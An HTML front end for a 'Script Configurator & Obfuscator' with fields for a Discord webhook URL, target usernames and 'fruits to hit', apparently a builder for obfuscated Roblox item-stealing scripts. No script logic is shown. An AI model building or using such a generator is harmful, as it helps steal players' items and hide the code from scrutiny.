<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Script Configurator & Obfuscator</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Use Inter font */
        body {
            font-family: Inter, sans-serif;
        }
        /* Custom styles for checkbox layout */
        .checkbox-container label {
            display: flex;
            align-items: center;
            padding: 4px 8px;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.2s ease-in-out;
        }
        .checkbox-container label:hover {
            background-color: #e5e7eb; /* light gray hover */
        }
        .checkbox-container input[type="checkbox"] {
            margin-right: 8px;
            accent-color: #4f46e5; /* indigo */
        }
        .checkbox-container input[type="checkbox"]:checked + span {
             font-weight: 600; /* bold text for selected */
        }
        /* Style for error messages */
        #errorMessages {
            background-color: #fee2e2; /* Light red background */
            color: #b91c1c; /* Darker red text */
            padding: 12px; /* Increased padding */
            border-radius: 6px; /* Slightly more rounded */
            border: 1px solid #fecaca; /* Lighter red border */
            margin-bottom: 1.5rem; /* More space below */
            font-size: 0.9rem; /* Slightly larger font */
        }
    </style>
</head>
<body class="min-h-screen bg-gray-100 flex flex-col items-center pt-10 pb-10 font-sans">

    <div class="w-full max-w-3xl px-4">

        <h1 class="text-3xl md:text-4xl font-bold mb-8 text-gray-800 text-center">Script Configurator & Obfuscator</h1>

        <div id="errorMessages" class="hidden" role="alert">
            </div>

        <div class="input-group bg-white p-6 rounded-lg shadow-md mb-6">
            <label for="webhookUrl" class="block mb-2 text-lg font-semibold text-gray-700">1. Discord Webhook URL:</label>
            <input type="text" id="webhookUrl" placeholder="Enter your Discord Webhook URL" class="w-full p-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 text-base">
        </div>

        <div class="input-group bg-white p-6 rounded-lg shadow-md mb-6">
            <label for="usernamesInput" class="block mb-2 text-lg font-semibold text-gray-700">2. Usernames (one per line, no spaces):</label>
            <textarea id="usernamesInput" rows="5" placeholder="user1&#10;user2&#10;user3" class="w-full p-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 resize-y min-h-[100px] text-base"></textarea>
            <p class="text-sm text-gray-500 mt-2">Press Enter/Return after each username. Do not include spaces.</p>
        </div>

        <div class="input-group bg-white p-6 rounded-lg shadow-md mb-6">
            <label class="block mb-3 text-lg font-semibold text-gray-700">3. Select Fruits to Hit:</label>
            <div id="fruitCheckboxes" class="checkbox-container grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-x-4 gap-y-2 max-h-60 overflow-y-auto border border-gray-200 rounded-md p-4 bg-gray-50">
                <p class="text-gray-500 col-span-full">Loading fruits...</p>
            </div>
             <button id="deselectAllFruits" type="button" class="mt-4 px-4 py-2 text-sm bg-gray-200 text-gray-800 font-medium rounded-md hover:bg-gray-300 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-500 transition duration-150">Deselect All</button>
        </div>

        <div class="text-center my-8">
            <button id="generateButton" class="px-10 py-4 bg-gradient-to-r from-blue-600 to-indigo-700 text-white text-lg font-bold rounded-lg shadow-lg hover:from-blue-700 hover:to-indigo-800 focus:outline-none focus:ring-4 focus:ring-indigo-300 focus:ring-opacity-75 transition duration-200 ease-in-out transform hover:scale-105">
                Generate & Obfuscate Script
            </button>
             <p id="loadingIndicator" class="text-gray-600 mt-4 hidden">Processing...</p>
        </div>

        <div id="outputSection" class="output-group bg-white p-6 rounded-lg shadow-md hidden">
            <h2 class="text-xl font-semibold mb-4 text-gray-800">Obfuscated Script:</h2>
            <pre class="bg-gray-800 text-gray-100 p-4 border border-gray-600 rounded-md max-h-96 overflow-y-auto text-sm font-mono whitespace-pre-wrap break-words"><code id="outputScript">-- Your obfuscated script will appear here...</code></pre>
            <button id="copyButton" class="mt-5 px-6 py-2 bg-green-600 text-white font-semibold rounded-lg shadow-md hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-400 focus:ring-opacity-75 transition duration-150 ease-in-out">
                Copy to Clipboard
            </button>
        </div>

    </div>

    <script src="script.js"></script>
</body>
</html>
